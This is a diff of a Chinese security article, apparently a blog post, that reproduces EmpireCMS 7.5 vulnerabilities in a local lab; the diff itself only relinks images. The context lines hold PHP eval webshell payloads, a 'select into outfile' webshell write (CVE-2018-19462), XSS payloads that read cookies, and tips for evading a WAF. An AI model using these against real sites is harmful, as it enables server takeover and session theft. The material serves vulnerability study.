@@ -53,7 +53,7 @@ schema_version: "1"
 
 帝国 cms 的默认安装路径为 http://localhost/e/install，进入安装一直往下
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOVIRo13sER2Fo0LEJgbjExIVOsh3JYWd42U3GskkIo6AicXYQO56tmxg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO8bZrTU746sgyZ4xb1lp0fFokGVZ7Iibbd4w4D3WJBfroh60iamZulvvQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOMsWzcyVticHhDfuvHY5kJSG9EujVMRlibictv9KEwjtTGiblCw4lN0NibhA/640?wx_fmt=png)
+![](../../.resource/remote/1ac4b3f3295ca6928dec9f8039c15d3415151e7898f9a254b632b782e7533034.png)![](../../.resource/remote/e2c9ec0b39f8679852278342aff769cbc162a1cb651450bb797c1afd292e4631.png)![](../../.resource/remote/2906ffabd71473290c015eb86afec42e77fcb766503c37aa20d54126f45b8dbb.png)
 
 到连接数据库这一步，mysql 版本可以选择自动识别，也可以自己选择相应版本，这里数据库如果在本地就填写 localhost（127.0.0.1）。
 
@@ -69,23 +69,23 @@ schema_version: "1"
 grant all on *.* to admin@'%' identified by '123456' with grant option;flush privileges;
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOWIgyibbsT7lQDDSk2vZ2WN6HqiafPHFoyhCtAaR0KuzWGMKjbgXMkvzA/640?wx_fmt=png)
+![](../../.resource/remote/f4d16a26ee9e3c1203b8bdcbbfdd31e17e15be4cca3fb265c8a84da8a5ba8cbd.png)
 
 点击下一步就会自动在数据库生成一个 empirecms 的数据库并在其中建立许多个表
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOvEWicb6ficzIIC2PJdmq5GazMhWJGIlJBMqVmghu8wTnlbh0H4nE6o9g/640?wx_fmt=png)
+![](../../.resource/remote/9da62ab61678aa636685cfbcfc71fc42ede957e56b9faf1479be57e5ee1a4a32.png)
 
 然后再设置进入后台管理员的密码
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO7LCicafTGhrbnJCyiaBtG66icQopr7q4fvrOyQSQLjakyXSCANaAvnT6A/640?wx_fmt=png)
+![](../../.resource/remote/f8d799aa0c2a539e2569897b55bf2f794e87fa721689cc6f5281c3f039a1ca0e.png)
 
 下一步即可安装完成，这里提示要删除路径避免被再次安装，但是这个地方其实设置了两层保护，即使你访问 install 这个路径会有一个. off 文件在路径下，需要将这个. off 文件删除后才能再次安装
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOoFAia7SZGPI8aib5vbs6272qloEpJTrgyP61vKegXwyBPAc0E4YSicn5Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOHc91rZ4GO7VYlAr22U2yQx8z112CckIsialSWPqBtFc92fEicFBLPqzQ/640?wx_fmt=png)
+![](../../.resource/remote/4e67ac28a53fbd0d2c2618df6b9273162495d175bc425f0feb5a317aed647379.png)![](../../.resource/remote/68f739dfbd64933d3208ce34a22fa68905007b5fae8c163d2126c55a06744306.png)
 
 输入设置的后台管理员用户名和密码即可进入管理员后台
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOh3iaHPUXT8tTI8ckfAGds5zFxptia0icAwk1G0dy5FzngJJ9UuUCgBW3w/640?wx_fmt=png)
+![](../../.resource/remote/685cdfd72a398a354a7952668c59ded5f1eba42ecdec2e59a7d3768b7a595807.png)
 
 漏洞原理及复现
 =======
@@ -131,7 +131,7 @@ EmpireCMS7.5 版本中的 / e/class/moddofun.php 文件的”LoadInMod” 函数
 
 来到导入系统模型的页面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOeudiasvEiau1Ovx2KnWyybJnBgZRibbveTib87ckvJISljrcsklTWDIcvg/640?wx_fmt=png)
+![](../../.resource/remote/44e2b225693b474ac6bfdae8a8ab74bdcabd94553270ba9c95bd39f08fb2e770.png)
 
 本地准备一个 1.php 并改名为 1.php.mod，注意这里需要用 \$ 进行转义，存放的数据表名需要填一个数据库内没有的表名，点击上传
 
@@ -139,43 +139,43 @@ EmpireCMS7.5 版本中的 / e/class/moddofun.php 文件的”LoadInMod” 函数
 <?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOn3CkZhFPW4vm1UiciaL88mlzfgeuiaDFk8cgnSI4RNpbbjHKrxkmDzrzg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzObo8Xviay6Uh5iaIR06YM83s14WpQw13diaLicv3lS7B9vFicQU7k4t67W4A/640?wx_fmt=png)
+![](../../.resource/remote/a48a3c8ec7f4565a7908abab72015e35b9269e7eb74aed28e3656281988f114c.png)![](../../.resource/remote/2b69854c860a1e8ba73aa21deb550ac0dc17fe64c74c63db70efe1648ee74f9d.png)
 
 导入成功后访问一下生成 shell 看能不能访问得到，没有报错是可以访问到的，那么证明已经上传成功了
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO7LCicafTGhrbnJCyiaBtG66icQopr7q4fvrOyQSQLjakyXSCANaAvnT6A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOHiaKqkPLklZia5qZUue7OSpV2fIkdBHgyxiaZ3vIytKJv4fk7ukoRy2EQ/640?wx_fmt=png)
+![](../../.resource/remote/f8d799aa0c2a539e2569897b55bf2f794e87fa721689cc6f5281c3f039a1ca0e.png)![](../../.resource/remote/1347f476aa5648916b13fe27cde496874d79a483838865e0d756216ecb883f70.png)
 
 再用蚁剑连接即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOGiaSkC1v0MjUfmDtYhibRBIjw6ibwq7IRQuaWwls8bzZJLETia6uns621g/640?wx_fmt=png)
+![](../../.resource/remote/370b19afaa6c4212d9d2614c0cd1ffc21d19cacd1113f676e381f21d515022c9.png)
 
 ### 几个实战中遇到的坑
 
 1. 有 waf 报错 500
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOj73K4ZXGuaib885wBUl1ic95kB3fQcgXPUdsOnJ2xstdeMMJazRkWg8A/640?wx_fmt=png)
+![](../../.resource/remote/7265b57d7c1edd9351a2060773322ca6e7e23772d60dbe19654fe19a6527135a.png)
 
 500 很容易联想到禁止 web 流量，那么我们上传的一句话木马默认情况下是不进行加密的，所以很容易被 waf 识别并拦截。
 
 解决方法：使用蚁剑自带的 base64 编码器和解密器即可成功上线，这里也可以用自己的编码器和解密器绕过 waf 拦截
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOmX98SUlUe9TCPUZa2d0lqoZJsnU62QYxZr9CXYVXeWfZTEIkuHCdZA/640?wx_fmt=png)
+![](../../.resource/remote/09edfe7209247dec90bd039b0711fa9a6cc0921048501d785c1ed389009f7b98.png)
 
 2. 不能使用冰蝎、哥斯拉马
 
 因为要在 $ 之前加 \ 转义，冰蝎转义后的 php.mod 应该如下图所示
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOZHAHLHKcT8aoAoBD0ELWQ0u4s4ppLJxzCIvKZq3YT2gibMYIiaR6gORw/640?wx_fmt=png)
+![](../../.resource/remote/4f1a058c104efcdd8f6fe22a54bccacfbbe9f6e45f08a9a51473a684e4621a77.png)
 
 上传到模型处就无回显
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOniaGAprpg2247hy0ic3cU4hNRRjlHdA3G1eic2d4OoW18R4th5vlYA0Rg/640?wx_fmt=png)
+![](../../.resource/remote/1ef7e22eb32a2a77712314e8841bf2e8c6d89facbf50a584750812f3cbef67b0.png)
 
 ### 实战小技巧
 
 如果有 waf 拦截 web 流量就走加密传输，如果始终连接不上就要一步步的进行排查。这里可以在一句话密码后面输出一个 echo 123，通过是否有回显来探测哪一步没有完善导致连接不成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOEDtoIvwgW1cXnCgbFyvVX4tzhF3poHicmibLjENLMs6ZrxJhEbtdW3fA/640?wx_fmt=png)
+![](../../.resource/remote/7b8aa7401f923be29b13ec4902eef65eb19c9f30a6426e58ac38e260c2880862.png)
 
 代码注入 (CVE-2018-19462)
 ---------------------
@@ -190,7 +190,7 @@ EmpireCMS7.5 及之前版本中的 admindbDoSql.php 文件存在代码注入漏�
 
 执行 sql 语句处
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO3dSOkKVGYKqJzmF5uw4ibABC3G2RzDCy662tzkx5cTUzuibamCD4zm8A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO77hcR4tfdicrZB9ibT7WkV3TxxF3bZpNzJ7hMgksiayLWxJWnOvNJRiaLw/640?wx_fmt=png)
+![](../../.resource/remote/252906bfa4fcbe7432f6ae3e6724246e45e62ad6764e2f0b3289c2efad4d8baf.png)![](../../.resource/remote/41bdb191b7098aaf410ee439ec156e2d6b791380f3110e0a579efbf9a0027d53.png)
 
 分析源码定位漏洞出现的位置在 localhost/EmpireCMS/e/admin/db/DoSql.php，对 sqltext 进行 RepSqlTbpre 函数处理
 
@@ -220,15 +220,15 @@ EmpireCMS7.5 及之前版本中的 admindbDoSql.php 文件存在代码注入漏�
 <?php file_put_contents("getshell.php","<?php phpinfo();?>");?>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOiaTdEaIiaHkFq2UJ3GWK84F1PcItdA3SLe0QgSYfeWOao8FeYXFibqCjw/640?wx_fmt=png)
+![](../../.resource/remote/e6d012f5a35844e5f87833475943800f9bddae21af3f2446ffde19a947ef6ed4.png)
 
 访问即可打出 phpinfo
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOfFoBzcPFsD4vcMhEDicfNVqt0Ylw7oqgMBibVOke8CQGhtoWmom6sXjA/640?wx_fmt=png)
+![](../../.resource/remote/340e3c42f287a634ce59e1c6045c21bee1d57200a2e0aa4cd4cdf8066d8e3162.png)
 
 这里只是找到了 php 的绝对路径，还不是 web 所存储的路径，这时候查看源代码搜索 DOCUMENT_ROOT 查询网站所处的绝对路径
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOhHmfhu6QmH8ic3KWV2s9K7fO0icwyXOIaUMZByhB0adwZfs9NBSfAf1g/640?wx_fmt=png)
+![](../../.resource/remote/9c03798008779c7ad69dffa9edbf8409df307554e579f7d7b9046d0681c4ae02.png)
 
 用 select ... into outfile 语句写入 php 一句话木马
 
@@ -236,19 +236,19 @@ EmpireCMS7.5 及之前版本中的 admindbDoSql.php 文件存在代码注入漏�
 select '<?php @eval($_POST[LEOGG])?>' into outfile 'C:/phpStudy/PHPTutorial/WWW/EmpireCMS/e/admin/Get.php'
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOAdmLa6Acc5jdibTWperf6ia3iawLia2stQGicl1gLusrKuawSE4Td7GzjVA/640?wx_fmt=png)
+![](../../.resource/remote/3e45be39c9d063dded420746f69bcefddade659346a962babf007c31b4fd2a10.png)
 
 看到上传已经成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOTtqfqVnlP7oJXSn4RkezWibeWONicnkRNnp8eAKI8giaMofvAZXhHs5FA/640?wx_fmt=png)
+![](../../.resource/remote/c02fea6d4007e054a16a9b0ff95d2ee27ff335e6dd8d3917922877c2db1cad34.png)
 
 访问一下是存在的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOQmvqLZa9A7yLReialSO8eotxGzD77WB9vJHzmbb9X9TL9MXKKYSVFPg/640?wx_fmt=png)
+![](../../.resource/remote/dc26a76efc7aa1091106e1328a26534c372b1efac2d5c10e985eb6ed1c48ed72.png)
 
 直接上蚁剑连接即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOnPwblP1NrJss1YOVsDeC6OqHIudwR8ib0iaficic3ibq7bsCmBxAoibic0iccQ/640?wx_fmt=png)
+![](../../.resource/remote/af0b4e535fc556ae6c5e204b4182fc2385f26278d39a0ce06b14a5b4ad5481ba.png)
 
 ### 实战中的一些坑
 
@@ -256,11 +256,11 @@ select '<?php @eval($_POST[LEOGG])?>' into outfile 'C:/phpStudy/PHPTutorial/WWW/
 
 这个地方很明显报错就是限制数据库的导入跟导出，这里很明显判断 secure_file_priv = NULL，所以当实战中出现在这种情况下是不能够用这种方法的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOzcmRhzRTXyNbL04urqicY4W81ZI5c2bK8eKDjyJtGYFtyMiaz5MK01VQ/640?wx_fmt=png)
+![](../../.resource/remote/f2cb08ff0e20bc15dc7e03602ca52a7f59009c1f150ffed775cf255b3d962833.png)
 
 如果在本地可以修改或添加 secure_file_priv = 这一行语句
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOXUsibZk8siccyyG6IeYXT40nQ5D3hkvwRhsw3Wsh0huwqeJVCzAkctxg/640?wx_fmt=png)
+![](../../.resource/remote/effa454214eba89173e27cbaa86356b17653e553ef45b3de1d2910a35d5c3015.png)
 
 后台 xss
 ------
@@ -317,7 +317,7 @@ addslashes() 函数返回在预定义字符之前添加反斜杠的字符串
 
 然而输出的位置是在 iframe 标签的 src 里，这意味着之前的过滤都没有什么用。iframe 标签可以执行 js 代码，因此可以利用 javascript:alert(/xss/) 触发 xss
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOHa1l3BAcqKcyU0wMeUuic8AaMFksKTf7QaZVbEDB4p0bgXXooicR9kwQ/640?wx_fmt=png)
+![](../../.resource/remote/ad2305749abadfe54525c112972d2162cd9286706b4a1f4941ca57e943e0a9ca.png)
 
 ### payload
 
@@ -329,7 +329,7 @@ payload 如下：
 
 其中 ehash 是随机生成的，在登录时可以看到 ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf，如果缺少这个 hash 值，则会提示非法来源
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOftC2ia7hmGZk282Ww6tqUibZvjW4P1Efe8AxIaeiaVeNstLY8qrunoBHg/640?wx_fmt=png)
+![](../../.resource/remote/0203d057902a66792bb100bf8920cb7d89ed6690f2ef2962834e62d1afff21cc.png)
 
 获取 cookie 信息 payload
 
@@ -337,7 +337,7 @@ payload 如下：
 192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(document.cookie)
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOPl9SOE5LSG5iafzlzTrLX91TsJaT7trqTyLCodPz6gxWGtaUc3L2ZEw/640?wx_fmt=png)
+![](../../.resource/remote/07e492a2d996da9c8afff7b37188dafd886dd230da1e65dc042524ca19b75cc0.png)
 
 前台 xss
 ------
@@ -384,19 +384,19 @@ javascript: 伪协议可以和 HTML 属性一起使用，该属性的值也应�
 
 点击图片触发 xss
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOhx2oUB2L6iaa8EDznZbrYnJibAv9RSfL2TvHIfBhgFKwqzM5n09fDyJw/640?wx_fmt=png)
+![](../../.resource/remote/b3f6cbdff1635badbc440df13d6c3df8ac518607a6fe9f644248a039bda58987.png)
 
 得到网页 cookie
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOPG8jq114K0L0AqUGJPUvzGKluVNpewPIhyov0w0c93KqG4Qvf1OjNw/640?wx_fmt=png)
+![](../../.resource/remote/da2574628e9d491b9192132d04d4f840ad1fda03298003553ba857d8aa506d00.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)
+![](../../.resource/remote/40aaad22af7f44171fc001f77fa3df3da580afe10e64b4cc679d75fa1c5f4216.png)
 
 **推荐阅读：**
 
 本月报名可以参加抽奖送 Kali NetHunter 手机的优惠活动  
 
-[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497897&idx=1&sn=5801b91d451b4c253eb3e2c5ff220673&chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&scene=21#wechat_redirect)
+[![](../../.resource/remote/7995b9e27a8398a9416d1e11b70d34ba0c54909cbf29d555ccbd9ea2faa8e15a.jpg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497897&idx=1&sn=5801b91d451b4c253eb3e2c5ff220673&chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&scene=21#wechat_redirect)
 
 **点赞，转发，在看**
 
@@ -404,7 +404,7 @@ javascript: 伪协议可以和 HTML 属性一起使用，该属性的值也应�
 
 未经授权，禁止转载
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)
+![](../../.resource/remote/3d59406a47f491f83d62987436684eaf1bfb52529e9b5762264fd89bfd614dc4.gif)
 
 ---
 
